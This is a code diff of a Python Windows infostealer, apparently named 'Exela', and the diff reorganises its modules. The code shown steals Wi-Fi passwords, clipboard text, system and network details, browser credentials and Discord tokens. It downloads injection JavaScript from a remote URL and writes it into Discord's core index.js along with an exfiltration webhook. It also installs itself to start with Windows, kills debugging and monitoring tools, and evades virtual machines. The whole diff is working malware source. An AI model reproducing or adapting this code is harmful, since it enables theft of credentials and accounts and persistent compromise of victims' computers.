@@ -117,6 +117,128 @@ class SubModules:
         except:
             return False
 
+
+class StealSystemInformation:
+    async def FunctionRunner(self) -> None:
+        try:
+            tasks = [
+                asyncio.create_task(self.StealSystemInformation()),
+                asyncio.create_task(self.StealWifiInformation()),
+                asyncio.create_task(self.StealProcessInformation()),
+                asyncio.create_task(self.StealNetworkInformation()),
+                asyncio.create_task(self.StealLastClipBoard()),
+            ]
+
+            await asyncio.gather(*tasks)
+        except Exception as error:
+            print(f"[-] An error occured while starting processes at the same time for steal system information, Error code => \"{error}\"")
+
+    async def GetDefaultSystemEncoding(self) -> str:
+        try:
+            cmd = "cmd.exe /c chcp"
+            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+            stdout, stderr = await process.communicate()
+            return stdout.decode(errors="ignore").split(":")[1].strip()
+        except:
+            return "null"
+
+    async def StealSystemInformation(self) -> None:
+        try:
+            print("[+] Stealing system information")
+            current_code_page = await self.GetDefaultSystemEncoding()
+            result = await asyncio.create_subprocess_shell(r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+            stdout, stderr = await result.communicate()
+            Variables.SystemInfo.append(stdout.decode(current_code_page))
+            print("[+] System information was successfully stolen")
+        except Exception as error:
+            print(f"[-] An error occured while stealing system information, error code => \"{error}\"")
+
+    async def StealProcessInformation(self) -> None:
+        try:
+            print("[+] Stealing running processes")
+            process = await asyncio.create_subprocess_shell(
+                "tasklist /FO LIST",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            stdout, stderr = await process.communicate()
+            Variables.Processes.append(stdout.decode(errors="ignore"))
+            print("[+] Running processes was successfully stolen")
+        except Exception as error:
+            print(f"[-] An error occured while stealing process information, => error code \"{error}\"")
+
+    async def StealLastClipBoard(self) -> None:
+        try:
+            print("[+] Stealing Last ClipBoard Text")
+            process = await asyncio.create_subprocess_shell(
+                "powershell.exe Get-Clipboard",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            stdout, stderr = await process.communicate()
+            if stdout:
+                Variables.ClipBoard.append(stdout.decode(errors="ignore")) 
+            print("[+] Last ClipBoard Text was successfully stolen")
+        except Exception as error:
+            print(f"[-] An error occured while stealing \"Last Clipboard Text\", => error code \"{error}\"")
+
+    async def StealNetworkInformation(self) -> None:
+        try:
+            print("[+] Stealing network information")
+            async with aiohttp.ClientSession() as session:
+                async with session.get("http://ip-api.com/json") as response:
+                    data = await response.json()
+                    ip = data["query"]
+                    country = data["country"]
+                    city = data["city"]
+                    timezone = data["timezone"]
+                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
+                    Variables.Network.append((ip, country, city, timezone, isp_info))
+            print("[+] Network information was successfully stolen")
+        except Exception as error:
+            print(f"[-] An error occured while stealing network information, => error code \"{error}\"")
+
+    async def StealWifiInformation(self) -> None:
+        try:
+            print("[+] Stealing wifi passwords")
+            current_code_page = await self.GetDefaultSystemEncoding()
+
+            process = await asyncio.create_subprocess_shell(
+                "netsh wlan show profiles", 
+                stdout=asyncio.subprocess.PIPE, 
+                stderr=asyncio.subprocess.PIPE, 
+                shell=True)
+            
+            stdout, stderr = await process.communicate()
+            decoded_profiles = None
+
+            try:
+                decoded_profiles = stdout.decode(current_code_page)
+            except:
+                decoded_profiles = stdout.decode(errors="ignore")
+            
+            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_profiles)
+            for profile_name in wifi_profile_names:
+                result = await asyncio.create_subprocess_shell(
+                    f'netsh wlan show profile name="{profile_name}" key=clear',
+                    stdout=asyncio.subprocess.PIPE,
+                    shell=True,
+                    encoding=None
+                )
+                stdout, _ = await result.communicate()
+                try:
+                    profile_output = stdout.decode(current_code_page)
+                except:profile_output = stdout.decode(errors="ignore")
+                wifi_passwords = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)
+
+                Variables.Wifis.append((profile_name, wifi_passwords.group(1) if wifi_passwords else "No password found"))
+            print("[+] Wifi passwords was successfully stolen")
+        except Exception as error:
+            print(f"[-] An error occurred while stealing wifi information, error code => \"{error}\"")
+
+
 class Main:
     def __init__(self) -> None:
         self.profiles_full_path = list()
@@ -128,10 +250,10 @@ class Main:
         self.FirefoxCookieList = list()
         self.FirefoxHistoryList = list()
         self.FirefoxAutofiList = list()
-    async def main(self):
+    async def FunctionRunner(self):
         await self.kill_browsers()
-        await self.list_profiles()
-        await self.ListFirefoxProfiles()
+        self.list_profiles()
+        self.ListFirefoxProfiles()
         taskk = [
             asyncio.create_task(self.GetPasswords()),
             asyncio.create_task(self.GetCards()),
@@ -143,18 +265,13 @@ class Main:
             asyncio.create_task(self.GetBookMark()),
             asyncio.create_task(self.GetAutoFill()),
             asyncio.create_task(self.GetFirefoxAutoFills()),
-            asyncio.create_task(self.GetProcessINfo()),
-            asyncio.create_task(self.GetLastClipboard()),
             asyncio.create_task(self.GetSteamSession()),
-            asyncio.create_task(self.GetSystemInfo()),
-            asyncio.create_task(self.ExrtactWifiPasswords()),
-            asyncio.create_task(self.GetNetworkInfo()),
             asyncio.create_task(self.GetTokens()),
-            asyncio.create_task(self.DiscordInjection()),]
+            StealSystemInformation().FunctionRunner()]
         await asyncio.gather(*taskk)
         await self.WriteToText()
         await self.SendAllData()
-    async def list_profiles(self) -> None:
+    def list_profiles(self) -> None:
         directorys = {
             'Google Chrome' : os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
             'Opera'  : os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
@@ -172,7 +289,7 @@ class Main:
                             folder_path = os.path.join(root, folder)
                             if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
                                 self.profiles_full_path.append(folder_path)
-    async def ListFirefoxProfiles(self) -> None:
+    def ListFirefoxProfiles(self) -> None:
         try:
             directory = os.path.join(self.RoamingAppData , "Mozilla", "Firefox", "Profiles")
             if os.path.isdir(directory):
@@ -430,7 +547,6 @@ class Main:
                 if os.path.exists(ext_path):
                     for wallet_name, wallet_addr in wallets_ext_names.items():
                         if os.path.isdir(os.path.join(ext_path, wallet_addr)):
-                            print(os.path.join(ext_path, wallet_addr))
                             try:
                                 splited = os.path.join(ext_path, wallet_addr).split("\\")
                                 file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
@@ -1367,66 +1483,6 @@ class Main:
         except Exception as e:
             print(e)
 
-    async def DiscordInjection(self) -> None:
-        try:
-            if discord_injection:
-                discord_dirs = {
-                        "Discord" : os.path.join(self.LocalAppData, "discord"),
-                        "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
-                        "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
-                        "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
-                    }
-                injection_code = await self.GetInjectionCode()
-                for f, _ in discord_dirs.items():
-                    if os.path.exists(_):
-                        indexPath:str = await self.FindIndexPath(_)
-                        if os.path.exists(indexPath):
-                            with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
-                                if not webhook in file.read():
-                                    await self.KillDiscord()
-                                    with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
-                                        x.write(injection_code.replace("%WEBHOOK%",webhook))
-                                    command = os.path.join(_, "Update.exe") + " --processStart Discord.exe"
-                                    result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
-                                    await result.communicate()
-        except:
-            pass
-    async def FindIndexPath(self, path:str) -> str:
-        try:
-            for file in os.listdir(path):
-                if re.search(r'app-+?', file):
-                    modules_dir = os.path.join(path,file, "modules")
-                    for modules_files in os.listdir(modules_dir):
-                        if re.search(r'discord_desktop_core-+?', modules_files):
-                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
-                            index_path = os.path.join(core_path, "index.js")
-                            if os.path.isfile(index_path):
-                                return index_path
-        except:
-            return "Null"
-    async def KillDiscord(self) -> None:
-        try:
-            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
-            stdout, stderr = await proc.communicate()
-            processes = stdout.decode(errors="ignore").split('\n')
-            for proc in processes:
-                if 'discord' in proc.lower():
-                    try:
-                        pid = int(proc.split()[1])
-                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                        await kill_proc.wait()
-                    except:
-                        pass
-        except:
-            pass
-    async def GetInjectionCode(self) -> str:
-        try:
-            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
-                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
-                    data = await response.text()
-                    return data.replace("%WEBHOOK%", webhook)
-        except:
-            return "null"
     async def GetSteamSession(self) -> None:
         try:
             all_disks = []
@@ -1506,84 +1562,7 @@ class Main:
             async with session.get(url) as response:
                 return await response.text()
         except:return "null"
-    async def ExrtactWifiPasswords(self) -> None:
-        try:
-            result = await asyncio.create_subprocess_shell('chcp', stdout=asyncio.subprocess.PIPE, shell=True) # get current system encoding
-            stdout, _ = await result.communicate()
-            current_code_page = stdout.decode(errors="ignore").split(":")[1].strip()
-
-            result = await asyncio.create_subprocess_shell(
-                f'netsh wlan show profiles',
-                stdout=asyncio.subprocess.PIPE,
-                shell=True,
-            )
-            stdout, _ = await result.communicate()
-            try:
-                decoded_name = stdout.decode(current_code_page)
-            except:decoded_name = stdout.decode("utf-8")
-            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_name)
-            for profile_name in wifi_profile_names:
-                result = await asyncio.create_subprocess_shell(
-                    f'netsh wlan show profile name="{profile_name}" key=clear',
-                    stdout=asyncio.subprocess.PIPE,
-                    shell=True,
-                    encoding=None
-                )
-                stdout, _ = await result.communicate()
-                try:
-                    profile_output = stdout.decode(current_code_page)
-                except:profile_output = stdout.decode("utf-8")
-                password_match = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)
-                Variables.Wifis.append((profile_name, password_match.group(1) if password_match else "No password found"))
-        except:
-            pass
-    async def GetSystemInfo(self) -> None:
-        try:
-            result = await asyncio.create_subprocess_shell('chcp', stdout=asyncio.subprocess.PIPE, shell=True)
-            stdout, _ = await result.communicate()
-            current_code_page = stdout.decode().split(":")[1].strip()
-            result = await asyncio.create_subprocess_shell(r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, shell=True)
-            stdout, _ = await result.communicate()
-            Variables.SystemInfo.append(stdout.decode(current_code_page))
-        except Exception as e:
-            print(e)
-    async def GetNetworkInfo(self) -> None:
-        try:    
-            async with aiohttp.ClientSession() as session:
-                async with session.get("http://ip-api.com/json") as response:
-                    data = await response.json()
-                    ip = data["query"]
-                    country = data["country"]
-                    city = data["city"]
-                    timezone = data["timezone"]
-                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
-                    Variables.Network.append((ip, country, city, timezone, isp_info))
-        except Exception as e:
-            print(str(e))
-    async def GetProcessINfo(self) -> None:
-        try:
-            process = await asyncio.create_subprocess_shell(
-                "tasklist /FO LIST",
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                shell=True
-            )
-            stdout, stderr = await process.communicate()
-            Variables.Processes.append(stdout.decode())
-        except:pass
-    async def GetLastClipboard(self) -> None:
-        try:
-            process = await asyncio.create_subprocess_shell(
-                "powershell.exe Get-Clipboard",
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                shell=True
-            )
-            stdout, stderr = await process.communicate()
-            if stdout:
-                Variables.ClipBoard.append(stdout.decode(errors="ignore"))
-        except:
-            pass
+    
     async def WriteToText(self) -> None:
         try:
             cmd = "wmic csproduct get uuid"
@@ -1965,6 +1944,81 @@ class UploadGoFile:
             return None
 
 
+class DiscordInjection:
+    def __init__(self) -> None:
+        self.tokens = Variables.ValidatedTokens # stolen discord tokens for logout discord accounts
+        self.already_killed = False
+        self.LocalAppData = os.getenv("localappdata")
+        print(self.tokens)
+    async def InjectIntoToDiscord(self) -> None:
+        try:
+            if discord_injection:
+                print("[+] Starting discord injection")
+                discord_dirs = {
+                        "Discord" : os.path.join(self.LocalAppData, "discord"),
+                        "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
+                        "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
+                        "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
+                    }
+                injection_code = await self.GetInjectionCode()
+                for f, file_paths in discord_dirs.items():
+                    if os.path.exists(file_paths):
+                        indexPath = await self.FindIndexPath(file_paths)
+                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
+                            if not webhook in file.read():
+                                if not self.already_killed:
+                                    await self.KillDiscord()
+                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
+                                    x.write(injection_code.replace("%WEBHOOK%",webhook))
+                                command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
+                                result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
+                                await result.communicate()
+                print("[+] Discord Injection was executed successfuly")  
+        except Exception as error:
+            print(f"[-] An error occured while injection to discord, error code => \"{error}\"")
+
+    async def GetInjectionCode(self) -> str:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
+                    data = await response.text()
+                    return data.replace("%WEBHOOK%", webhook)
+        except Exception as error:
+            print(f"[-] An error occured while getting injection code, error code => \"{error}\"")
+            return None
+
+    async def KillDiscord(self) -> None:
+        try:
+            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+            stdout, stderr = await proc.communicate()
+            processes = stdout.decode(errors="ignore").split('\n')
+            for proc in processes:
+                if 'discord' in proc.lower():
+                    try:
+                        pid = int(proc.split()[1])
+                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                        await kill_proc.communicate()
+                        self.already_killed = True
+                    except:
+                        pass
+        except:
+            pass
+
+    async def FindIndexPath(self, path:str) -> str:
+        try:
+            for file in os.listdir(path):
+                if re.search(r'app-+?', file):
+                    modules_dir = os.path.join(path, file, "modules")
+                    for modules_files in os.listdir(modules_dir):
+                        if re.search(r'discord_desktop_core-+?', modules_files):
+                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
+                            index_path = os.path.join(core_path, "index.js")
+                            if os.path.isfile(index_path):
+                                return index_path
+        except:
+            return None
+
+
 class StealCommonFiles:
     def __init__(self) -> None:
         self.temp = os.getenv("temp")
@@ -2050,15 +2104,15 @@ class Startup:
         self.ToPath:str = os.path.join(self.LocalAppData, "ExelaUpdateService", "Exela.exe")
     async def main(self) -> None:
         await self.CreatePathAndMelt()
-        print("Started startup injection.")
+        print("[+] Started startup injection.")
         if startup_method == "schtasks":
             await self.SchtaskStartup()
         elif startup_method == "regedit":
             await self.RegeditStartup()
         elif startup_method == "folder":
             await self.FolderStartup()
-        else:print("unsupported or unkown startup method!")
-        print(f"Succesfully executed startup injection.")
+        else:print("[-] unsupported or unkown startup method!")
+        print(f"[+] Succesfully executed startup injection.")
     async def CreatePathAndMelt(self) -> None:
         try:
             if os.path.exists(self.ToPath): # if the startup file already exist, return
@@ -2133,12 +2187,12 @@ class Startup:
         try:
             if self.Privalage: #if the code running admin privilage, copy to common startup path
                 if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe"):
-                    print("File already on startup!")
+                    print("[+] File already on startup!")
                 else:
                     shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe")
             else: #if the code not running admin privilage, copy to normal startup path
                 if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe")):
-                    print("File already on startup!")
+                    print("[+] File already on startup!")
                 else:
                     shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe"))
         except Exception as e:
@@ -2155,12 +2209,12 @@ class AntiDebug:
         self.banned_process = ["HTTP Toolkit.exe", "httpdebuggerui.exe","wireshark.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                                      "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
 
-    async def calback(self):
-        print("Anti Debugging Started.")
+    async def FunctionRunner(self):
+        print("[+] Anti Debugging Started.")
         taskk = [asyncio.create_task(self.check_system()),
                  asyncio.create_task(self.kill_process())]
         await asyncio.gather(*taskk)
-        print(f"Anti Debug Succesfully Executed.")
+        print(f"[+] Anti Debug Succesfully Executed.")
     async def check_system(self) -> None:
         cmd = "wmic csproduct get uuid"
         process = await asyncio.create_subprocess_shell(
@@ -2207,7 +2261,7 @@ class AntiDebug:
             pass
 
 class AntiVM:
-    async def Main(self) -> None:
+    async def FunctionRunner(self) -> None:
         print("Anti-VM started.")
         taskk = [
             asyncio.create_task(self.CheckGpu()),
@@ -2344,14 +2398,15 @@ if __name__ == '__main__':
         else:
             start_time = time.time()
             if Anti_VM:
-                asyncio.run(AntiVM().Main())
-            asyncio.run(AntiDebug().calback())
+                asyncio.run(AntiVM().FunctionRunner())
+            asyncio.run(AntiDebug().FunctionRunner())
             if not startup_method == "no-startup":
                 asyncio.run(Startup().main())
             asyncio.run(Fakerror())
             main_instance = Main()
-            asyncio.run(main_instance.main())
+            asyncio.run(main_instance.FunctionRunner())
+            asyncio.run(DiscordInjection().InjectIntoToDiscord())
             asyncio.run(StealCommonFiles().StealFiles())
-            print(f"The code executed on: {str(time.time() - start_time)} second")
+            print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
     else:
         print("just Windows Operating system's supported by Exela")
